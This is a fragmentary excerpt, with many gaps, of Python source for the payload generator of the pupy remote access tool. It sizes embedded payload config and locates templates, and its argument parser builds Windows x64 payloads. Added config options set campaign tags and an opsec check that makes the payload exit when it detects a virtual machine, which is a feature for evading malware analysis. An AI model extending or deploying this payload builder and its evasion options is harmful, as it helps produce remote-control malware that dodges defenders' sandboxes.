...
from pupy.pupylib.utils.jarsigner import jarsigner, JARSIGNER_AVAILABLE
...
# Precompiled payload templates (set URL khi có bản release tương ứng)
PRECOMPILED_TEMPLATES_DOWNLOAD_URL = "https://github.com/n1nj4sec/pupy/releases"
MAX_EMBEDDED_CONFIG_BYTES = 500000
...
def get_edit_binary(target, display, path, conf):
    ...
    if new_conf_len > MAX_EMBEDDED_CONFIG_BYTES:
        raise Exception(
            'Error: config or offline script too long ({}/{} bytes)'
            'You need to recompile the dll with '
            'a bigger buffer'.format(new_conf_len, MAX_EMBEDDED_CONFIG_BYTES)
        )
    #if not is_pyoxidizer:
    #    new_conf = new_conf + os.urandom(MAX_EMBEDDED_CONFIG_BYTES-new_conf_len)
    #else:
    #    new_conf = new_conf + (b"#"*(MAX_EMBEDDED_CONFIG_BYTES-new_conf_len))

    logger.debug('Free space: %d', MAX_EMBEDDED_CONFIG_BYTES-new_conf_len)
...
def get_raw_conf(display, conf, verbose=False):
    ...
    if verbose:
        config_table = [{
            'KEY': k, 'VALUE': 'PRESENT' if (
                ...
                str(v) if type(v) not in (tuple, list, set) else ' '.join(
                    str(x) for x in v
                )
            )
    ...
    config = {
        ...
        # Campaign / opsec cho payload (tùy chọn, không phá tương thích cũ)
        'campaign': conf.get('campaign', os.environ.get('PUPY_CAMPAIGN', '')),
        'opsec_check_vm': (
            str(conf.get('opsec_check_vm', os.environ.get('PUPY_OPSEC_CHECK_VM', '')))
            .strip().lower() not in ('', '0', 'false', 'no')
        ),
        'opsec_exit_on_vm': (
            str(conf.get('opsec_exit_on_vm', os.environ.get('PUPY_OPSEC_EXIT_ON_VM', '1')))
            .strip().lower() not in ('0', 'false', 'no')
        ),
    }
    ...
    if not os.path.isfile(template):
        ...
        if not os.path.isdir(templatedir):
            ...
            if res.lower().strip()=="y" or res.lower().strip()=="yes" or res.lower().strip()=="":
                display(Info("Download feature not implemented. Please compile templates manually or use existing templates."))
                return
...
CLIENT_OS = ['windows']
CLIENT_ARCH = ['x64'] # x86 removed


def get_parser(base_parser, config):
    parser = base_parser(
        description='Generate payloads for Windows x64.'
    )
    ...
    parser.add_argument(
        ...
        choices=CLIENT_ARCH, help='Target arch (default: x64)'
    )
